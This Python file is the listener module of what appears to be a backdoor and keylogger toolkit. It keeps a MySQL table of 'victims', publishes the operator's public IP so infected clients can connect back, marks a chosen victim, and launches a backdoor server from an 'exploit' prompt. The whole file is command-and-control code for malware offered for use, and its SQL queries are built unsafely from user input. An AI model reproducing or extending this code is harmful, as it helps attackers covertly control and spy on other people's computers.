from requests import get
from libs.colors import COLORS
from subprocess import check_output, CalledProcessError, call
from os import devnull
from terminaltables import AsciiTable
from mysql.connector import connect
from socket import socket, AF_INET, SOCK_DGRAM


devnull = open(devnull, 'w')
colors = COLORS()

global program_path
global activated_option


def print_backdoor_listener_options(inputs_dict):
    descriptions = {
        'LPORT':'This is the listening port of the server',
        'LHOST': 'This is the listening IP address of the server',
        'PID': 'This is the ID of the victims client virus'
    }

    print(colors.RESET, end='')
    table_data = [[f'{colors.BOLD}Option', f'{colors.BOLD}Current Setting', f'{colors.BOLD}Description{colors.RESET}']]
    for item in inputs_dict:
        try:
            single_data = [str(item), str(inputs_dict[item]), descriptions[item]]
            table_data.append(single_data)
        except KeyError:
            pass

    table = AsciiTable(table_data)
    print(table.table, end='\n\n')


def update_setting(setting, new_value, save_values):
    save_values[setting] = new_value
    return save_values


def read_credential_file(program_path):
    credentials = {}
    with open(program_path + '/data/database_credentials.txt', 'r') as credential_file:
        while True:
            content_line = credential_file.readline()
            if not content_line:
                break

            if content_line[-1] == '\n':
                content_line = content_line[:-1]

            if len(content_line) > 0:
                key, content = content_line.split('=')
                credentials[key] = content

    return credentials


def show_victim_data():
    global program_path

    try:
        credentials = read_credential_file(program_path)
        sql_database = connect(
            host     = credentials['Server'],
            user     = credentials['Username'],
            passwd   = credentials['Password'],
            database = credentials['Database'],
            port     = credentials['Port']
        )

        my_cursor = sql_database.cursor()
        command = 'SELECT * FROM `users`'
        my_cursor.execute(command)
        
        data = list(map(list,my_cursor.fetchall()))

        header = [[colors.BOLD + 'PID', 'Name', 'MAC address', 'Selected' + colors.RESET]]

        table = AsciiTable(header + data)
        print(table.table)

        print(colors.RESET, end='\n\n')
        


    except Exception as error:
        print(colors.Red + '[✘]Error occured during the proccess')
        print('[✘]{}'.format(error) + colors.RESET)


def draw_table(heading, data):
    print('\n\n' + colors.BOLD + colors.ULINE + "Report of Key logger data" + colors.RESET)

    real_data = [heading]
    real_data.extend(data)

    table = AsciiTable(real_data)
    print(table.table)


def add_new_victim():
    global program_path

    p_id = input('\tInput Program ID ----> ')
    name = input('\tInput Victim Name ---> ')

    try:
        credentials = read_credential_file(program_path)
        sql_database = connect(
                host     = credentials['Server'],
                user     = credentials['Username'],
                passwd   = credentials['Password'],
                database = credentials['Database'],
                port     = credentials['Port']
            )

        print(colors.Green + '[✔]Conncected to the database')

        my_cursor = sql_database.cursor()
        sql_input_command = "INSERT INTO `users`(`p_id`, `name`, `mac_addr`, `hack`) VALUES({}, '{}', '', 0)".format(p_id, name)
        my_cursor.execute(sql_input_command)
        print(colors.Green + '[✔]Victim inserted to the databse\n' + colors.RESET)

        sql_database.commit()

    except Exception as error:
        print(colors.Red + '[✘]Error occured while inserting please red the error message \n[✘]Error: {}'.format(error) + colors.RESET)


def execute_listener(settings):
    global program_path
    credentials = read_credential_file(program_path)

    try:
        # Firstly try to read the public IP address
        ip = get('https://api.ipify.org').text
        print(colors.Green + '[✔]Dynamic ip {} found'.format(ip) + colors.RESET)

        try:
            # Then try to reach the data base and upload it to the base
            hacker_database = connect(
                host     = credentials['Server'],
                user     = credentials['Username'],
                passwd   = credentials['Password'],
                database = credentials['Database'],
                port     = credentials['Port']
            )
            my_cursor = hacker_database.cursor()
            print(colors.Green + '[✔]Reached to database successfully' + colors.RESET)

            ip_insert_command = "UPDATE `ip_addr` SET `ip`='{}' WHERE `id` = 1".format(ip)
            my_cursor.execute(ip_insert_command)
            print(colors.Green + '[✔]IP address uploaded successfully' + colors.RESET)


            try:
                # select victim data
                victim_selection = "SELECT * FROM `users` WHERE `p_id` = {}".format(settings['PID'])
                my_cursor.execute(victim_selection)
                victim_data = list(map(list, my_cursor.fetchall()))
                print(colors.Green + '[✔]Selected victim data downloaded successfully' + colors.RESET)

                # set all victims un selected
                command = "UPDATE `users` SET `hack` = 0"
                my_cursor.execute(command)
                # set selectited vicim selected
                command = "UPDATE `users` SET `hack` = 1 WHERE `p_id` = {}".format(settings['PID'])
                my_cursor.execute(command)
                print(colors.Green + '[✔]Selected victim setteled successfully' + colors.RESET)
                hacker_database.commit()
            

                # start external terminal to hack
                call("gnome-terminal -x bash -c 'python2 libs/backdoor/server.py {} {};exit; exec bash'".format(settings['LHOST'], settings['LPORT']), shell=True, stderr=devnull, stdin=devnull, stdout=devnull)

            except Exception as error:
                print(colors.Red + '[✘]Error occured while setting the victim read error\n[✘]Error: {}'.format(error))
        except Exception as error:
            print(colors.Red + '[✘]Error occured while uploading the dynamic IP read the error\n[✘]Error: {}'.format(error) + colors.RESET)
    except Exception as error:
        print(colors.Red + '[✘]Error occured while reading dynamic IP read the error\n[✘]Error: {}'.format(error) + colors.RESET)



def activate_listener():
    # from the begining used command line interface
    global activated_option

    s = socket(AF_INET, SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    private_ip = s.getsockname()[0]
    s.close()


    saved_inputs_dict = {
        'LPORT':'4343',
        'LHOST': private_ip,
        'PID': '1'
    }

    while True:
        # get the command from the user
        command = input("".join(activated_option) + ' > ')

        if command == 'show victims':
            show_victim_data()

        elif command == 'clear':
            call('clear', shell=True)

        elif command == 'exit' or command == 'quit':
            activated_option.remove(' {}listen({}Backdoor{}{}){}'.format(colors.BOLD, colors.Red, colors.RESET, colors.BOLD, colors.RESET))
            break

        elif command == 'help':
            logo_printer.print_help()

        elif command == '' or command == ' ':
            pass

        elif command == 'run' or command == 'exploit':
            execute_listener(saved_inputs_dict)

        elif command == 'add' or command == 'add victim':
            add_new_victim()

        # if the command is show options then show options
        elif command == 'show options' or command == 'options':
            print_backdoor_listener_options(saved_inputs_dict)

        # if the command is set then update the settings wales
        elif command.split()[0] == 'set':
            try:
                setting = command.split()[1]
                new_value = command.split()[2]
                saved_inputs_dict = update_setting(setting, new_value, saved_inputs_dict)
            except IndexError:
                pass

        else:
            print(colors.Red + '[✘]Invalid comand' + colors.RESET)


activate_listener()